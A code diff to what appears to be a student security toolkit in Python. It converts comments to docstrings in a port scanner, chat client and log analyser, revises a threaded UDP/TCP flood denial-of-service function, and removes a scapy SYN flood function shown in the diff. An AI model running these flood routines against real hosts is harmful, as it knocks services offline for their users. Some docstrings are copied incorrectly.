@@ -89,6 +89,20 @@ def authentication(user, passwd):
 
 
 def login():
+    """
+    
+    Parameters
+    -------
+    user : string
+    passwd : string
+        The password inputted.
+
+    Returns
+    -------
+    is_authenticated : boolean
+        Returns True and the user name.
+
+    """
     is_allowed = True
     user = input("Enter the username: ")
     passwd = input("Enter the password: ")
@@ -96,15 +110,27 @@ def login():
     return is_allowed, user
 
 
-'''
-This function aims to determine the active connections on the machine. 
-It uses the command "netstat -a" to get information about the active connections and 
-stores this information in a variable called "netstat". 
-It then breaks this information into lines and prints them to the screen.
-'''
+
 
 
 def active_connections():
+    """
+    This function aims to determine the active connections on the machine.
+    It uses the command "netstat -a" to get information about the active connections and
+    stores this information in a variable called "netstat".
+    It then breaks this information into lines and prints them to the screen.
+
+    
+    Parameters
+    -------
+    netstat : netstat -a list
+
+    Returns
+    -------
+    active connections on the machine
+
+
+    """
     print("Calculating active connections...")
 
     netstat = os.popen("netstat -a").read()
@@ -113,24 +139,30 @@ def active_connections():
     print(netstat)
 
 
-'''
-This function aims to perform a port scan on a specific target. 
-It uses Python's socket module to connect to different ports on 
-the target and check if they are open or closed. 
-It starts by asking the user to enter the target to be scanned and 
-gets the IP address of that target. 
-Then it defines a function called "portscan" that tries to connect 
-to a specific port on the target and, 
-if the connection is successful, prints out the open port. If the 
-connection is not successful, the function passes. 
-It also defines a function called "threader" that creates multiple 
-threads to perform the port scan in parallel, which speeds up the process.
-It uses a queue to store the ports to be scanned and measures the time spent on the scan.
-
-'''
-
-
 def port_scanner():
+    """
+    This function aims to perform a port scan on a specific target.
+    It uses Python's socket module to connect to different ports on
+    the target and check if they are open or closed.
+    It starts by asking the user to enter the target to be scanned and
+    gets the IP address of that target.
+    Then it defines a function called "portscan" that tries to connect
+    to a specific port on the target and,
+    if the connection is successful, prints out the open port. If the
+    connection is not successful, the function passes.
+    It also defines a function called "threader" that creates multiple
+    threads to perform the port scan in parallel, which speeds up the process.
+    It uses a queue to store the ports to be scanned and measures the time spent on the scan.
+
+
+        Parameters
+        -------
+        target : string
+
+        Returns
+        -------
+        open ports in target and Time taken
+    """
     socket.setdefaulttimeout(0.25)
     print_lock = threading.Lock()
 
@@ -169,22 +201,35 @@ def port_scanner():
     print('Time taken:', time.time() - startTime)
 
 
-'''
-The "udpflood" function is a denial-of-service (DoS) attack script that sends UDP or TCP
-packets to a specific host on the specified on the specified port. 
-The script prompts the user for information such as the IP address of the host, the port, 
-whether to send UDP or TCP packets, and the number of packets to be sent over a single connection. 
-It also allows the user to specify the number of threads they want to use to send the packets. 
-It does this by creating multiple threads with the "Thread" method of the "threading" library 
-and then starts these threads with the "start()" method. The script also has a "new" function that 
-allows the user to start the attack again with the same settings without having to rerun the whole script. 
-'''
 
 
-def udpflood():
+def flood():
+    
+    """
+    The "udpflood" function is a denial-of-service (DoS) attack script that sends UDP or TCP
+    packets to a specific host on the specified on the specified port.
+    The script prompts the user for information such as the IP address of the host, the port,
+    whether to send UDP or TCP packets, and the number of packets to be sent over a single connection.
+    It also allows the user to specify the number of threads they want to use to send the packets.
+    It does this by creating multiple threads with the "Thread" method of the "threading" library
+    and then starts these threads with the "start()" method. The script also has a "new" function that
+    allows the user to start the attack again with the same settings without having to rerun the whole script.
+
+    Parameters
+    -------
+    ip : string
+    port : int
+    choice : string
+    times : int
+    threads : int
+
+    Returns
+    -------
+    udp or tcp flood atack 
+    """
     ip = str(input(" Host/Ip:"))
     port = int(input(" Port:"))
-    choice = str(input(" UDP(y/n):"))
+    choice = str(input(" chose run flood atack (udp/tcp):"))
     times = int(input(" Packets per one connection:"))
     threads = int(input(" Threads:"))
 
@@ -206,7 +251,7 @@ def udpflood():
             try:
                 # TCP = SOCK_STREAM
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((ip, port))
+                s.connect((ip, 80))
                 s.send(data)
                 for x in range(times):
                     s.send(data)
@@ -214,7 +259,7 @@ def udpflood():
                 s.close()
 
     for y in range(threads):
-        if choice == 'y':
+        if choice == 'udp':
             th = threading.Thread(target=run)
             th.start()
         else:
@@ -223,84 +268,45 @@ def udpflood():
 
     def new():
         for y in range(threads):
-            if choice == 'y':
+            if choice == 'udp':
                 th = threading.Thread(target=run)
                 th.start()
             else:
                 th = threading.Thread(target=run2)
                 th.start()
 
-'''
-The "synflood" function is a function that creates a SYN flood attack. This is a form of DDoS attack 
-(Distributed Denial of Service) attack in which the attacker sends too many SYN requests to the target, 
-exceeding its capacity to handle valid connections and thus making it inaccessible to legitimate users.
-
-The "sendPackages" function is an internal function that sends TCP SYN packets to the specified target with 
-the specified IP address and port. The "count" argument specifies the number of packets to be sent.
-
-Before calling the "sendPackages" function, the "synflood" function asks the user 
-to enter the target (IP and port) and whether he wants to limit the number of packets sent. 
-If the user does not want to limit, the variable "have_limit" is set to "False" and the 
-sendPackages" function will be called in an infinite loop, sending 1000 packets each iteration. 
-If the user wants to limit, he will be asked for the number of packets to be sent and 
-the function "sendPackages" will be called only once with the specified number of packets.
-'''
-def synflood():
-    def sendPackages(target_ip, target_port, count):
-        p=IP(dst=target_ip)/TCP(flags="S",  sport=RandShort(),  dport=int(target_port))
-        send(p,  verbose=0, loop=1, count=count)
-
-    target_ip = input("Target IP: ") 
-    target_port = input("Target Port: ") 
-    have_limit = input("Do you want to send unlimted pachakges (yes/no): ")
-    packages_count = 0
-
-    if(len(target_ip) == 0):
-        target_ip = "8.8.8.8"
-    if(len(target_port) == 0):
-        target_port = 80
-
-    if( have_limit != "yes" and have_limit != "y"):
-        have_limit = True
-        while(True):
-            packages_count = input("How many packages do you want to send (only int values permited)? ")
-            if(packages_count.isdigit()):
-                packages_count = int(packages_count)
-                break
-    else:
-        have_limit = False
-        
-    if(have_limit == True):
-        sendPackages(target_ip, target_port, packages_count)
-        print(str(packages_count) + " packages sended")
-    else:
-        counter = 0
-        while True:
-            counter += 1000
-            sendPackages(target_ip, target_port, counter)
-            print("1000 more packages sended\nTotal:" + str(counter))
-        
-
-'''
-The chat() function is responsible for implementing the client side of a messaging application. 
-It allows the user to choose a server to send an RSA-encrypted message to and also read all messages sent to the server. 
-The function presents a number of options for the user, such as sending an encrypted message, reading messages from the server or 
-exiting the application. When choosing option 1, the user is prompted for the server's IP address and port, and then the function checks 
-if there are already RSA keys generated to encrypt the message. If not, the user is prompted to generate a new key. 
-The message is then encrypted and sent to the server over a socket connection. 
-Option 2 allows the user to read the messages sent to the server by again entering the server's IP address and port. 
-The function uses the sqlite3 library to connect to the database and retrieve the user ID. 
-The function also uses the socket library to establish the connection to the server and the RSA library to encrypt and decrypt the messages.
-'''
-
 
 def chat():
+    """
+    The chat() function is responsible for implementing the client side of a messaging application.
+    It allows the user to choose a server to send an RSA-encrypted message to and also read all messages sent to the server.
+    The function presents a number of options for the user, such as sending an encrypted message, reading messages from the server or
+    exiting the application. When choosing option 1, the user is prompted for the server's IP address and port, and then the function checks
+    if there are already RSA keys generated to encrypt the message. If not, the user is prompted to generate a new key.
+    The message is then encrypted and sent to the server over a socket connection.
+    Option 2 allows the user to read the messages sent to the server by again entering the server's IP address and port.
+    The function uses the sqlite3 library to connect to the database and retrieve the user ID.
+    The function also uses the socket library to establish the connection to the server and the RSA library to encrypt and decrypt the messages.
+    
+    Parameters
+    -------
+    ip : string
+    port : int
+    choice : string
+    times : int
+    threads : int
+
+    Returns
+    -------
+    udp or tcp flood atack 
+    """
+
     options_chat = '''\nChoose a option:
 
-[1]->Send message encrypted with RSA.
-[2]->Read messages from server.
-[3]->Exit.
-    '''
+    [1]->Send message encrypted with RSA.
+    [2]->Read messages from server.
+    [3]->Exit.
+        '''
 
     # Get id of user from database
     try:
@@ -493,20 +499,27 @@ def chat():
             print("Choose a NUMBER between 1 and 3.")
 
 
-'''
-The function log_manager() is responsible for analyzing the logs provided by the teacher and 
-creating a heatmap for each log. It presents a menu interface for the user to choose between analyzing the UFW or SSH logs. 
-If the UFW option is chosen, the function opens the corresponding log file, extracts all IP addresses and 
-stores them in a list. It also uses the geoip2 library to get the geographic coordinates of these IP addresses and 
-print out the countries from which these IPs were blocked. It then generates and saves a heatmap with these coordinates and 
-creates a PDF file with information about the blocked IPs. If the SSH option is is chosen, the function runs a command to 
-create a file with all logs of failed login attempts, extracts the IP addresses and times of these events and stores them in a list. 
-It also uses the geoip2 library to get the geographic coordinates of these IP addresses and generates and saves a heatmap with these 
-coordinates and creates a PDF file with information about the failed login attempts. failures. The function also has an option to exit the menu.
-'''
-
 
 def log_manager():
+    """
+    The function log_manager() is responsible for analyzing the logs provided by the teacher and 
+    creating a heatmap for each log. It presents a menu interface for the user to choose between analyzing the UFW or SSH logs. 
+    If the UFW option is chosen, the function opens the corresponding log file, extracts all IP addresses and 
+    stores them in a list. It also uses the geoip2 library to get the geographic coordinates of these IP addresses and 
+    print out the countries from which these IPs were blocked. It then generates and saves a heatmap with these coordinates and 
+    creates a PDF file with information about the blocked IPs. If the SSH option is is chosen, the function runs a command to 
+    create a file with all logs of failed login attempts, extracts the IP addresses and times of these events and stores them in a list. 
+    It also uses the geoip2 library to get the geographic coordinates of these IP addresses and generates and saves a heatmap with these 
+    coordinates and creates a PDF file with information about the failed login attempts. failures. The function also has an option to exit the menu.
+    Parameters
+    -------
+    Choose a option to read log files 
+
+    Returns
+    -------
+    generate_pdf with with all logs of failed login attempts, extracts the IP addresses and times of these events and stores them in a list anf geo location
+    
+    """
     options_chat = '''\nChoose a option:
 
 [1]->UFW logs.
@@ -659,28 +672,17 @@ def log_manager():
             print("Choose a NUMBER between 1 and 3.")
 
 
-'''
-The above function is used to generate a PDF file based on three arguments: the filename a list of tuples with IP, 
-country and timestamp information, and a title. 
-The first step is to print a message that the report is being created. 
-Next a SimpleDocTemplate object is created with the file name and page size. 
-A "Flowable" object container is created and a title is added to the report using the Paragraph object and object and a specific font style. 
-Next, a table is created from the list of tuples passed as argument and added to the element container.
-Finally, the document is built and saved with the specified name. 
-The function also prints a message that the PDF has been successfully saved.
-    Parameters
-    ------
-    filename : str
-        The filename of the pdf to be created.
-    ip_country : list of tuples
-        The list contains tuples that have ip, country and timestamp.
-    title : str
-        Title of the pdf.
-
-'''
-
-
 def generate_pdf(filename, ip_country, title):
+    """
+    The above function is used to generate a PDF file based on three arguments: the filename a list of tuples with IP, 
+    country and timestamp information, and a title. 
+    The first step is to print a message that the report is being created. 
+    Next a SimpleDocTemplate object is created with the file name and page size. 
+    A "Flowable" object container is created and a title is added to the report using the Paragraph object and object and a specific font style. 
+    Next, a table is created from the list of tuples passed as argument and added to the element container.
+    Finally, the document is built and saved with the specified name. 
+    The function also prints a message that the PDF has been successfully saved.
+    """
 
     print("\nCreating report...")
 
@@ -795,9 +797,8 @@ MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 [2]->Connections active.
 [3]->Secure messaging service.
 [4]->Analyze and process log files.
-[5]->UDP flood DOS atack.
-[6]->UDP flood DOS atack.
-[7]->Exit.
+[5]->flood DOS atack.
+[x]->Exit.
     '''
 
     print(banner)
@@ -821,10 +822,8 @@ MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
             elif answer == "4":
                 log_manager()
             elif answer == "5":
-                udpflood()
-            elif answer == "6":
-                synflood()                       
-            elif answer == "7":
+                flood()
+            elif answer == "x":
                 break
 
             else:
